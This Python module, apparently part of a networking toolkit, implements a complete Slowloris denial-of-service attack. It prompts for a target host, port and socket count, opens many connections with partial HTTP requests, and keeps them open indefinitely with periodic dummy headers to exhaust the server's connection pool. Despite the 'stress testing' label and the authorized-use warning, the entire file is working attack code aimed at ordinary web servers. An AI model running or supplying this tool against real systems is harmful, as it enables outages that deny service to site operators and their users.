import socket
import time
import threading
import color

DESCRIPTION = "Slowloris HTTP Stress Testing Tool"
GROUP_ID = 1  # Networking Tools
COLOR = color.BLUE

def init_socket(ip: str, port: int):
    """Initialize a slow HTTP connection socket."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, port))
    
    # Send partial HTTP request
    s.send(b"GET /?%s HTTP/1.1\r\n" % str(time.time()).encode())
    s.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n")
    s.send(b"Accept-language: en-US,en;q=0.5\r\n")
    return s

def run_slowloris(ip: str, port: int, socket_count: int):
    """Keep sockets alive by sending periodic dummy headers."""
    print(color.color_text(f"[+] Creating {socket_count} sockets to target {ip}:{port}...", color.GREEN))
    
    socket_list = []
    for _ in range(socket_count):
        try:
            s = init_socket(ip, port)
            socket_list.append(s)
        except Exception:
            pass

    print(color.color_text(f"[+] Successfully established {len(socket_list)} slow sockets. Maintaining connections...", color.YELLOW))

    try:
        while True:
            for s in list(socket_list):
                try:
                    s.send(b"X-a: b\r\n")
                except Exception:
                    socket_list.remove(s)
                    try:
                        new_s = init_socket(ip, port)
                        socket_list.append(new_s)
                    except Exception:
                        pass
            time.sleep(10)
    except Exception:
        pass
    finally:
        for s in socket_list:
            try:
                s.close()
            except Exception:
                pass

def run():
    print(color.color_text("--- Slowloris HTTP Stress Tool ---", COLOR))
    print(color.color_text("[!] Warning: Use only for authorized web server stress testing and educational purposes.\n", color.RED))
    
    target = input("Enter target IP address or domain: ").strip()
    if not target:
        print(color.color_text("[!] Target cannot be empty.", color.RED))
        return

    try:
        target_ip = socket.gethostbyname(target)
    except Exception as e:
        print(color.color_text(f"[!] Could not resolve target: {e}", color.RED))
        return

    try:
        target_port = int(input("Enter target port (e.g., 80): ").strip() or "80")
        sockets_num = int(input("Enter number of sockets (e.g., 50): ").strip() or "50")
    except ValueError:
        print(color.color_text("[!] Invalid numeric input provided.", color.RED))
        return

    print(color.color_text(f"\n[+] Starting Slowloris attack simulation against {target_ip}:{target_port}...\n", color.GREEN))
    print(color.color_text("[*] Press Ctrl+C to stop the test.\n", color.CYAN))

    try:
        run_slowloris(target_ip, target_port, sockets_num)
    except KeyboardInterrupt:
        print(color.color_text("\n[!] Slowloris test stopped by user.", color.RED))
    except Exception as e:
        print(color.color_text(f"[!] Error running Slowloris: {e}", color.RED))
